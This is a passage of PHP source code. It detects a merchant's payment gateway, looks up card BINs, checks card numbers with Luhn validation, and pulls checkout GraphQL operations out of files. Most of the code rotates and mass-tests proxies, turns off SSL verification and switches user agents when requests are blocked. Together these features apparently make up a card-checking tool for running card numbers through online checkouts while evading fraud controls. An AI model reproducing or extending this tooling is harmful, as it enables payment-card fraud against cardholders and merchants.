            'card_networks' => ['visa','mastercard'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['cross_border','marketplace'],
            'funding_types' => ['cards','wallet'],
        ],
        'flutterwave' => [
            'name' => 'Flutterwave',
            'keywords' => ['flutterwave', 'flw-', 'rave-checkout'],
            'url_keywords' => ['flutterwave.com'],
            'aliases' => ['flutterwave', 'rave'],
            'card_networks' => ['visa','mastercard','verve'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['mpesa','mobile_money','bank'],
            'funding_types' => ['cards','mobile_money','bank'],
        ],
        'payfast' => [
            'name' => 'PayFast',
            'keywords' => ['payfast', 'payfast-checkout'],
            'url_keywords' => ['payfast.co.za'],
            'aliases' => ['payfast'],
            'card_networks' => ['visa','mastercard'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['instant_eft','bitcoin'],
            'funding_types' => ['cards','eft','bitcoin'],
        ],
        'cashfree' => [
            'name' => 'Cashfree',
            'keywords' => ['cashfree', 'cashfree-checkout', 'cftoken'],
            'url_keywords' => ['cashfree.com'],
            'aliases' => ['cashfree'],
            'card_networks' => ['visa','mastercard','rupay'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['upi','netbanking','wallets'],
            'funding_types' => ['cards','upi','netbanking','wallets'],
        ],
        'instamojo' => [
            'name' => 'Instamojo',
            'keywords' => ['instamojo', 'instamojo-checkout'],
            'url_keywords' => ['instamojo.com'],
            'aliases' => ['instamojo'],
            'card_networks' => ['visa','mastercard','amex','rupay'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['upi','netbanking','wallets'],
            'funding_types' => ['cards','upi','netbanking','wallets'],
        ],
        'ccavenue' => [
            'name' => 'CCAvenue',
            'keywords' => ['ccavenue', 'ccavenue-checkout', 'ccavenuemerchant'],
            'url_keywords' => ['ccavenue.com'],
            'aliases' => ['ccavenue'],
            'card_networks' => ['visa','mastercard','amex','rupay','diners'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['upi','netbanking','wallets','emi'],
            'funding_types' => ['cards','upi','netbanking','wallets'],
        ],
        'billdesk' => [
            'name' => 'BillDesk',
            'keywords' => ['billdesk', 'billdesk-checkout'],
            'url_keywords' => ['billdesk.com'],
            'aliases' => ['billdesk'],
            'card_networks' => ['visa','mastercard','rupay'],
            'supports_cards' => true,
            'three_ds' => 'mandatory',
            'features' => ['netbanking','upi'],
            'funding_types' => ['cards','netbanking','upi'],
        ],
        'paypal_payflow' => [
            'name' => 'PayPal Payflow',
            'keywords' => ['payflow', 'payflowpro', 'payflow-checkout'],
            'url_keywords' => ['payflow.com', 'paypal.com/payflow'],
            'aliases' => ['payflow', 'payflowpro'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['fraud_protection','tokenization'],
            'funding_types' => ['cards'],
        ],
        '2checkout' => [
            'name' => '2Checkout (Verifone)',
            'keywords' => ['2checkout', '2co', 'verifone'],
            'url_keywords' => ['2checkout.com'],
            'aliases' => ['2checkout', '2co', 'verifone'],
            'card_networks' => ['visa','mastercard','amex','discover','jcb'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['recurring','global'],
            'funding_types' => ['cards','paypal'],
        ],
        'bluepay' => [
            'name' => 'BluePay',
            'keywords' => ['bluepay', 'bluepay-checkout'],
            'url_keywords' => ['bluepay.com'],
            'aliases' => ['bluepay'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['tokenization','recurring'],
            'funding_types' => ['cards','ach'],
        ],
        'paysafe' => [
            'name' => 'Paysafe',
            'keywords' => ['paysafe', 'paysafecard', 'neteller'],
            'url_keywords' => ['paysafe.com', 'paysafecard.com'],
            'aliases' => ['paysafe', 'paysafecard'],
            'card_networks' => ['visa','mastercard'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['prepaid','digital_wallets'],
            'funding_types' => ['cards','prepaid','wallets'],
        ],
        'nmi' => [
            'name' => 'Network Merchants (NMI)',
            'keywords' => ['nmi', 'network merchants', 'nmi-checkout'],
            'url_keywords' => ['nmi.com'],
            'aliases' => ['nmi', 'network merchants'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['gateway','tokenization'],
            'funding_types' => ['cards'],
        ],
        'elavon' => [
            'name' => 'Elavon',
            'keywords' => ['elavon', 'converge', 'elavon-checkout'],
            'url_keywords' => ['elavon.com'],
            'aliases' => ['elavon', 'converge'],
            'card_networks' => ['visa','mastercard','amex','discover'],
            'supports_cards' => true,
            'three_ds' => 'optional',
            'features' => ['enterprise','pos'],
            'funding_types' => ['cards'],
        ],
    ];

    private static function normalizeToken(string $value): string
    {
        return strtolower(trim($value));
    }

    public static function unknown(): array
    {
        return [
            'id' => 'unknown',
            'name' => 'Unknown Gateway',
            'label' => 'Unknown Gateway',
            'confidence' => 0.0,
            'signals' => [],
            'card_networks' => [],
            'supports_cards' => false,
            'three_ds' => 'unknown',
            'aliases' => [],
            'features' => [],
            'funding_types' => [],
        ];
    }

    public static function detectAll(string $response, string $checkoutUrl = '', array $extraSignals = []): array
    {
        $body = strtolower($response);
        $url = strtolower($checkoutUrl);
        $extra = array_filter(array_map([self::class, 'normalizeToken'], $extraSignals), static function ($v) {
            return $v !== '';
        });

        $results = [];
        foreach (self::SIGNATURES as $id => $config) {
            $score = 0;
            $maxScore = 0;
            $signals = [];

            foreach ($config['keywords'] ?? [] as $keyword) {
                $needle = strtolower($keyword);
                if ($needle === '') {
                    continue;
                }
                $maxScore += 2;
                if (strpos($body, $needle) !== false) {
                    $score += 2;
                    $signals[] = 'kw:' . $keyword;
                }
            }

            foreach ($config['url_keywords'] ?? [] as $keyword) {
                $needle = strtolower($keyword);
                if ($needle === '') {
                    continue;
                }
                $maxScore += 1;
                if (strpos($url, $needle) !== false || strpos($body, $needle) !== false) {
                    $score += 1;
                    $signals[] = 'url:' . $keyword;
                }
            }

            foreach ($config['regex'] ?? [] as $regex) {
                if (!is_string($regex) || $regex === '') {
                    continue;
                }
                $maxScore += 3;
                if (@preg_match($regex, $response)) {
                    if (preg_match($regex, $response)) {
                        $score += 3;
                        $signals[] = 'rx:' . $regex;
                    }
                }
            }

            $aliasMatches = $config['aliases'] ?? [];
            $aliasNormalized = array_map([self::class, 'normalizeToken'], $aliasMatches);
            foreach ($extra as $token) {
                if ($token === '') {
                    continue;
                }
                if ($token === self::normalizeToken($config['name']) || in_array($token, $aliasNormalized, true)) {
                    $score += 4;
                    $maxScore += 4;
                    $signals[] = 'extra:' . $token;
                } elseif (strpos($token, self::normalizeToken($config['name'])) !== false) {
                    $score += 2;
                    $maxScore += 2;
                    $signals[] = 'extra:' . $token;
                }
            }

            if ($score <= 0) {
                continue;
            }

            $confidence = $maxScore > 0 ? min(1, $score / $maxScore) : 0;
            $results[] = [
                'id' => $id,
                'name' => $config['name'],
                'label' => $config['name'],
                'confidence' => round($confidence, 2),
                'signals' => array_values(array_unique($signals)),
                'card_networks' => $config['card_networks'] ?? [],
                'supports_cards' => $config['supports_cards'] ?? true,
                'three_ds' => $config['three_ds'] ?? 'unknown',
                'aliases' => $config['aliases'] ?? [],
                'features' => $config['features'] ?? [],
                'funding_types' => $config['funding_types'] ?? ['cards'],
            ];
        }

        if (empty($results)) {
            return [self::unknown()];
        }

        usort($results, static function (array $a, array $b): int {
            return $b['confidence'] <=> $a['confidence'];
        });

        return $results;
    }

    public static function detect(string $response, string $checkoutUrl = '', array $extraSignals = []): array
    {
        $results = self::detectAll($response, $checkoutUrl, $extraSignals);
        return $results[0] ?? self::unknown();
    }
}
}

$GLOBALS['__gateway_primary'] = $GLOBALS['__gateway_primary'] ?? GatewayDetector::unknown();
$GLOBALS['__gateway_candidates'] = $GLOBALS['__gateway_candidates'] ?? [$GLOBALS['__gateway_primary']];
$GLOBALS['__payment_context'] = $GLOBALS['__payment_context'] ?? null;

function find_between($content, $start, $end) {
  $startPos = strpos($content, $start);
  if ($startPos === false) {
    return '';
}
$startPos += strlen($start);
$endPos = strpos($content, $end, $startPos);
if ($endPos === false) { 
    return'';
}
return substr($content, $startPos, $endPos - $startPos);
}

/**
 * Check CC BIN/host information using BIN lookup API
 * Returns array with card info or false on failure
 */
function check_cc_bin(string $cc_number): array {
    $bin = substr($cc_number, 0, 6); // First 6 digits
    
    // Try multiple BIN lookup APIs
    $apis = [
        "https://lookup.binlist.net/{$bin}",
        "https://bins.su/api/v1/bins/{$bin}"
    ];
    
    foreach ($apis as $api_url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'User-Agent: Mozilla/5.0'
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($response !== false && $http_code == 200) {
            $data = json_decode($response, true);
            if ($data && is_array($data)) {
                // Normalize the response format
                $result = [
                    'valid' => true,
                    'bin' => $bin,
                    'brand' => $data['brand'] ?? ($data['scheme'] ?? 'UNKNOWN'),
                    'type' => $data['type'] ?? 'UNKNOWN',
                    'country' => $data['country']['alpha2'] ?? ($data['country'] ?? 'UNKNOWN'),
                    'country_name' => $data['country']['name'] ?? 'UNKNOWN',
                    'bank' => $data['bank']['name'] ?? ($data['bank'] ?? 'UNKNOWN')
                ];
                return $result;
            }
        }
    }
    
    // If APIs fail, do basic local validation
    return [
        'valid' => validate_luhn($cc_number),
        'bin' => $bin,
        'brand' => get_card_brand($cc_number),
        'type' => 'UNKNOWN',
        'country' => 'UNKNOWN',
        'country_name' => 'UNKNOWN',
        'bank' => 'UNKNOWN'
    ];
}

/**
 * Validate credit card number using Luhn algorithm
 */
function validate_luhn(string $number): bool {
    $number = preg_replace('/\D/', '', $number);
    $sum = 0;
    $length = strlen($number);
    
    for ($i = 0; $i < $length; $i++) {
        $digit = (int)$number[$length - $i - 1];
        if ($i % 2 == 1) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    
    return ($sum % 10 == 0);
}

/**
 * Get card brand from card number
 */
function get_card_brand(string $number): string {
    $number = preg_replace('/\D/', '', $number);
    
    // Visa
    if (preg_match('/^4/', $number)) {
        return 'VISA';
    }
    // Mastercard
    if (preg_match('/^5[1-5]/', $number) || preg_match('/^2[2-7]/', $number)) {
        return 'MASTERCARD';
    }
    // American Express
    if (preg_match('/^3[47]/', $number)) {
        return 'AMEX';
    }
    // Discover
    if (preg_match('/^6(?:011|5)/', $number)) {
        return 'DISCOVER';
    }
    // JCB
    if (preg_match('/^35/', $number)) {
        return 'JCB';
    }
    // Diners Club
    if (preg_match('/^3[068]/', $number)) {
        return 'DINERS';
    }
    
    return 'UNKNOWN';
}

function extractOperationQueryFromFile(string $filePath, string $operationName): ?string {
    $content = @file_get_contents($filePath);
    if ($content === false) {
        return null;
    }
    $needles = [
        'Proposal' => "=> 'query Proposal(",
        'SubmitForCompletion' => "=> 'mutation SubmitForCompletion(",
        'PollForReceipt' => "=> 'query PollForReceipt(",
    ];
    if (!isset($needles[$operationName])) {
        return null;
    }
    $needle = $needles[$operationName];
    $pos = strpos($content, $needle);
    if ($pos === false) {
        return null;
    }
    $start = $pos + strlen("=> '");
    $end = strpos($content, "',", $start);
    if ($end === false) {
        $end = strrpos($content, "'");
        if ($end === false || $end <= $start) {
            return null;
        }
    }
    return substr($content, $start, $end - $start);
}

/**
 * Detect proxy type from proxy string format
 * Supports: http://, https://, socks4://, socks5://, or auto-detect from port
 */
function get_proxy_type(string $proxy_string): int {
    $proxy_lower = strtolower($proxy_string);
    
    if (strpos($proxy_lower, 'socks5://') === 0 || strpos($proxy_lower, 'socks5h://') === 0) {
        return CURLPROXY_SOCKS5;
    }
    if (strpos($proxy_lower, 'socks4://') === 0 || strpos($proxy_lower, 'socks4a://') === 0) {
        return CURLPROXY_SOCKS4;
    }
    if (strpos($proxy_lower, 'https://') === 0) {
        return CURLPROXY_HTTPS;
    }
    if (strpos($proxy_lower, 'http://') === 0) {
        return CURLPROXY_HTTP;
    }
    
    // Default to HTTP if no protocol specified
    return CURLPROXY_HTTP;
}

function test_proxy_url(string $ip, string $port, string $username = '', string $password = '', string $type = 'http', string $testUrl = 'https://api.ipify.org?format=json'): bool {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $testUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
    // Aggressive timeouts for maximum speed
    $timeout = ($type === 'socks4' || $type === 'socks5') ? 5 : 3;
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout * 2);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: '.flow_user_agent(),
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.8,*/*;q=0.7',
        'Connection: keep-alive'
    ]);

    // Map type including hostname-resolving variants
    $ptype = CURLPROXY_HTTP;
    $lt = strtolower($type);
    if ($lt === 'socks4' || $lt === 'socks4a') {
        $ptype = (defined('CURLPROXY_SOCKS4A') && $lt === 'socks4a') ? CURLPROXY_SOCKS4A : CURLPROXY_SOCKS4;
    } elseif ($lt === 'socks5' || $lt === 'socks5h') {
        $ptype = (defined('CURLPROXY_SOCKS5_HOSTNAME') && $lt === 'socks5h') ? CURLPROXY_SOCKS5_HOSTNAME : CURLPROXY_SOCKS5;
    } elseif ($lt === 'https') {
        $ptype = CURLPROXY_HTTPS;
    } else {
        $ptype = CURLPROXY_HTTP;
    }
    curl_setopt($ch, CURLOPT_PROXY, $ip . ':' . $port);
    curl_setopt($ch, CURLOPT_PROXYTYPE, $ptype);
    // Use CONNECT tunnel for HTTPS targets when proxy is HTTP(S)
    $scheme = strtolower(parse_url($testUrl, PHP_URL_SCHEME) ?: 'http');
    $needsTunnel = ($scheme === 'https' && ($ptype === CURLPROXY_HTTP || $ptype === CURLPROXY_HTTPS));
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $needsTunnel);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    if (defined('CURLOPT_PROXYHEADER') && $ptype === CURLPROXY_HTTP) {
        curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
    }
    if (!empty($username) && !empty($password)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username . ':' . $password);
    }

    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    // Consider 2xx-4xx as reachable; only 5xx and network failures are hard fails
    return ($resp !== false && $code >= 200 && $code < 500);
}

// Backward-compatible wrapper using default ipify test URL
function test_proxy(string $ip, string $port, string $username = '', string $password = '', string $type = 'http'): bool {
    return test_proxy_url($ip, $port, $username, $password, $type, 'https://api.ipify.org?format=json');
}

/**
 * Auto-detect proxy type by testing all protocols
 * Returns the working protocol type or null if none work
 */
function detect_proxy_type(string $ip, string $port, string $username = '', string $password = '', ?string $preferredTestUrl = null): ?string {
    // When credentials are present, prioritize HTTP (common for rotating/residential proxies)
    // Otherwise test: socks5h > socks5 > http > socks4a > socks4 > https
    $hasAuth = ($username !== '' && $password !== '');
    if ($hasAuth) {
        $types = ['http', 'https', 'socks5h', 'socks5', 'socks4a', 'socks4'];
    } else {
        $types = ['socks5h', 'socks5', 'http', 'socks4a', 'socks4', 'https'];
    }

    // Build a list of candidate test URLs: prefer target site, then ipify
    $urls = [];
    if (!empty($preferredTestUrl)) { $urls[] = $preferredTestUrl; }
    $urls[] = 'https://api.ipify.org?format=json';
    $urls = array_values(array_unique($urls));

    foreach ($types as $type) {
        foreach ($urls as $u) {
            if (test_proxy_url($ip, $port, $username, $password, $type, $u)) {
                return $type;
            }
        }
    }
    return null;
}

// Normalize to scheme://ip:port[:user:pass]
function normalize_proxy_string(string $type, string $ip, string $port, string $user = '', string $pass = ''): string {
    $base = strtolower($type) . '://' . $ip . ':' . $port;
    if ($user !== '' && $pass !== '') {
        $base .= ':' . $user . ':' . $pass;
    }
    return $base;
}

// Save working proxy to file if not already present
function save_proxy_to_file(string $proxyString, string $file = 'ProxyList.txt'): void {
    $proxyString = trim($proxyString);
    if ($proxyString === '') return;
    $existing = [];
    if (file_exists($file)) {
        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $l) { $existing[trim($l)] = true; }
    }
    if (!isset($existing[$proxyString])) {
        file_put_contents($file, $proxyString . PHP_EOL, FILE_APPEND);
    }
}

// Apply proxy to a curl handle if a proxy is selected, enabling CONNECT only for HTTPS targets
function apply_proxy_if_used($ch, string $url): void {
    global $proxy_used, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $proxy_type;
    global $ROTATE_PROXY_PER_REQUEST, $__pm, $__pm_count;
    // Per-request rotation using ProxyManager if enabled and proxies available
    if ($ROTATE_PROXY_PER_REQUEST && $__pm_count > 0) {
        $proxy = $__pm->getNextProxy(true); // health-check to keep quality high
        if ($proxy) {
            $ptype = strtolower($proxy['type'] ?? 'http');
            $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
            $needsTunnel = ($scheme === 'https' && ($ptype === 'http' || $ptype === 'https'));
            $curlType = CURLPROXY_HTTP;
            if ($ptype === 'socks4') $curlType = CURLPROXY_SOCKS4;
            elseif ($ptype === 'socks4a' && defined('CURLPROXY_SOCKS4A')) $curlType = CURLPROXY_SOCKS4A;
            elseif ($ptype === 'socks5') $curlType = CURLPROXY_SOCKS5;
            elseif ($ptype === 'socks5h' && defined('CURLPROXY_SOCKS5_HOSTNAME')) $curlType = CURLPROXY_SOCKS5_HOSTNAME;
            elseif ($ptype === 'https') $curlType = CURLPROXY_HTTPS;

            $opts = [
                CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
                CURLOPT_PROXYTYPE => $curlType,
                CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            ];
            if ($curlType === CURLPROXY_HTTPS) {
                $opts[CURLOPT_SSL_VERIFYPEER] = false;
                $opts[CURLOPT_SSL_VERIFYHOST] = false;
            }
            if (!empty($proxy['user']) && !empty($proxy['pass'])) {
                $opts[CURLOPT_PROXYUSERPWD] = transform_rotating_username($proxy['user']) . ':' . $proxy['pass'];
            }
            if (defined('CURLOPT_PROXYHEADER') && $curlType === CURLPROXY_HTTP) {
                $opts[CURLOPT_PROXYHEADER] = ['Proxy-Connection: Keep-Alive'];
            }
            curl_setopt_array($ch, $opts);

            // Also update globals for final reporting
            $proxy_used = true;
            $proxy_ip = $proxy['ip'];
            $proxy_port = (string)$proxy['port'];
            $proxy_user = $proxy['user'] ?? '';
            $proxy_pass = $proxy['pass'] ?? '';
            $proxy_type = $ptype;
            return;
        }
        // if rotation failed, fall back to configured proxy below
    }
    // Fallback: apply the selected/static proxy
    if (!$proxy_used) return;
    $ptype = get_proxy_type($proxy_type . '://');
    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
    $needsTunnel = ($scheme === 'https' && ($ptype === CURLPROXY_HTTP || $ptype === CURLPROXY_HTTPS));

    $opts = [
        CURLOPT_PROXY => $proxy_ip . ':' . $proxy_port,
        CURLOPT_PROXYTYPE => $ptype,
        CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    ];
    // If using an HTTPS proxy, some builds require ignoring proxy SSL issues
    if ($ptype === CURLPROXY_HTTPS) {
        $opts[CURLOPT_SSL_VERIFYPEER] = false;
        $opts[CURLOPT_SSL_VERIFYHOST] = false;
    }
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        $opts[CURLOPT_PROXYUSERPWD] = transform_rotating_username($proxy_user) . ':' . $proxy_pass;
    }
    if (defined('CURLOPT_PROXYHEADER') && $ptype === CURLPROXY_HTTP) {
        $opts[CURLOPT_PROXYHEADER] = ['Proxy-Connection: Keep-Alive'];
    }
    curl_setopt_array($ch, $opts);
}

/**
 * ENHANCED FALLBACK: Execute request with automatic fallback strategies
 * 1. Try with proxy (if available)
 * 2. If proxy fails, try direct connection
 * 3. If still failing, try different user-agent
 * Returns: ['success' => bool, 'body' => string, 'code' => int, 'method' => string]
 */
function execute_with_fallback($ch, string $url, array $options = []): array {
    global $proxy_used, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $proxy_type;
    global $__pm, $__pm_count, $ROTATE_PROXY_PER_REQUEST;
    
    $cfg = runtime_cfg();
    $maxAttempts = $cfg['fast_fail'] ? 2 : 3;
    $attempt = 0;
    $lastError = '';
    
    // Store original proxy state
    $origProxyUsed = $proxy_used;
    $origProxyIp = $proxy_ip;
    
    while ($attempt < $maxAttempts) {
        $attempt++;
        
        // Attempt 1: Use proxy if available
        if ($attempt === 1 && $proxy_used) {
            apply_proxy_if_used($ch, $url);
            $method = 'proxy';
        }
        // Attempt 2: Try direct connection (no proxy)
        elseif ($attempt === 2) {
            // Clear proxy settings for direct connection
            curl_setopt($ch, CURLOPT_PROXY, '');
            $method = 'direct';
        }
        // Attempt 3: Try with different user-agent
        elseif ($attempt === 3 && class_exists('userAgent')) {
            $agent = new userAgent();
            $newUa = $agent->generate('windows');
            curl_setopt($ch, CURLOPT_USERAGENT, $newUa);
            $method = 'alt_ua';
        } else {
            $method = 'attempt_' . $attempt;
        }
        
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        
        // Success criteria: 2xx/3xx status AND non-empty body
        if ($code >= 200 && $code < 400 && !empty($body) && $error === '') {
            return [
                'success' => true,
                'body' => $body,
                'code' => $code,
                'method' => $method,
                'attempts' => $attempt
            ];
        }
        
        $lastError = $error ?: "HTTP $code";
        
        // Fast fail if explicitly requested
        if ($cfg['fast_fail'] && $attempt >= 1) {
            break;
        }
    }
    
    // All attempts failed
    return [
        'success' => false,
        'body' => '',
        'code' => 0,
        'method' => 'failed',
        'attempts' => $attempt,
        'error' => $lastError
    ];
}

/**
 * Select first working proxy from ProxyList.txt using parallel testing
 * - timeout unchanged (default 3s connect/overall)
 * - tests up to $concurrency proxies at a time
 * Returns full proxy string (may include scheme) or null
 */
function select_working_proxy_parallel(string $file = 'ProxyList.txt', int $timeout = 3, int $concurrency = 300): ?string {
    if (!file_exists($file)) return null;
    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return null;

    // Clean lines
    $proxies = [];
    foreach ($lines as $line) {
        $p = trim($line);
        if ($p === '' || $p[0] === '#') continue;
        $proxies[] = $p;
    }
    if (empty($proxies)) return null;

    // Chunked parallel testing
    $chunks = array_chunk($proxies, max(1, $concurrency));
    foreach ($chunks as $chunk) {
        $mh = curl_multi_init();
        $handles = [];

        foreach ($chunk as $proxyStr) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org?format=json');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            // Parse proxy scheme/type first to determine timeout
            $type = 'http';
            $proxyAddr = $proxyStr;
            if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $proxyStr, $m)) {
                $type = strtolower($m[1]);
                $proxyAddr = $m[2];
            }
            // SOCKS proxies need more time for SSL handshake
            $actualTimeout = ($type === 'socks4' || $type === 'socks5') ? ($timeout * 2) : $timeout;
            curl_setopt($ch, CURLOPT_TIMEOUT, $actualTimeout);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $actualTimeout);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            curl_setopt($ch, CURLOPT_ENCODING, '');
            curl_setopt($ch, CURLOPT_TCP_NODELAY, true);

            curl_setopt($ch, CURLOPT_PROXY, $proxyAddr);
            if ($type === 'socks4') {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
            } elseif ($type === 'socks5') {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            } else {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
                curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true); // HTTPS target needs CONNECT
                curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
                if (defined('CURLOPT_PROXYHEADER')) {
                    curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
                }
            }

            curl_multi_add_handle($mh, $ch);
            $handles[] = ['h' => $ch, 'proxy' => $proxyStr];
        }

        // Run this batch
        $running = null;
        do {
            $mrc = curl_multi_exec($mh, $running);
            if ($running) {
                curl_multi_select($mh, 0.5); // Reduced from 1.0 to 0.5 for faster response
                usleep(10000); // 10ms sleep to reduce CPU usage
            }
        } while ($running && $mrc == CURLM_OK);

        // Collect results
        $winner = null;
        foreach ($handles as $entry) {
            $ch = $entry['h'];
            $resp = curl_multi_getcontent($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($resp !== false && $code == 200 && $winner === null) {
                $winner = $entry['proxy'];
            }
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        curl_multi_close($mh);

        if ($winner !== null) return $winner;
    }

    return null;
}

/**
 * Check if a given proxy can reach a specific URL (HEAD/GET)
 */
function proxy_can_reach_url(string $proxyStr, string $url, int $timeout = 5): bool {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_NOBODY, false); // small GET is safer as some hosts block HEAD
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // timeouts adjusted below based on proxy type
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: '.flow_user_agent(),
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection: keep-alive'
    ]);

    // Parse proxy scheme/type
    $pc = parse_proxy_components($proxyStr);
    $type = $pc['type'];
    $proxyAddr = $pc['host'] . ($pc['port'] !== '' ? ':' . $pc['port'] : '');
    curl_setopt($ch, CURLOPT_PROXY, $proxyAddr);
    if ($type === 'socks4' || $type === 'socks4a') {
        $pt = (defined('CURLPROXY_SOCKS4A') && $type === 'socks4a') ? CURLPROXY_SOCKS4A : CURLPROXY_SOCKS4;
        curl_setopt($ch, CURLOPT_PROXYTYPE, $pt);
    } elseif ($type === 'socks5' || $type === 'socks5h') {
        $pt = (defined('CURLPROXY_SOCKS5_HOSTNAME') && $type === 'socks5h') ? CURLPROXY_SOCKS5_HOSTNAME : CURLPROXY_SOCKS5;
        curl_setopt($ch, CURLOPT_PROXYTYPE, $pt);
    } elseif ($type === 'https') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    if ($pc['user'] !== '') {
        $u = transform_rotating_username($pc['user']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $u . ':' . $pc['pass']);
    }

    // Adjust timeouts: SOCKS often needs more time
    $actualTimeout = ($type === 'socks4' || $type === 'socks5') ? ($timeout * 2) : $timeout;
    curl_setopt($ch, CURLOPT_TIMEOUT, $actualTimeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $actualTimeout);

    // Enable CONNECT only for HTTPS targets when using HTTP/HTTPS proxies
    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
    $needsTunnel = ($scheme === 'https' && ($type === 'http' || $type === 'https'));
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $needsTunnel);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    if (defined('CURLOPT_PROXYHEADER') && ($type === 'http' || $type === 'https')) {
        curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
    }

    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    // Consider any HTTP response code > 0 as reachable (5xx often indicates server-side blocks but proxy path works)
    return ($resp !== false && $code > 0);
}

/**
 * Pick the first proxy from file that can reach a specific URL
 */
function select_working_proxy_for_url(string $file, string $url, int $timeout = 3, int $concurrency = 200): ?string {
    if (!file_exists($file)) return null;
    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return null;
    $proxies = [];
    foreach ($lines as $line) {
        $p = trim($line);
        if ($p === '' || $p[0] === '#') continue;
        $proxies[] = $p;
    }
    if (empty($proxies)) return null;

    $chunks = array_chunk($proxies, max(1, $concurrency));
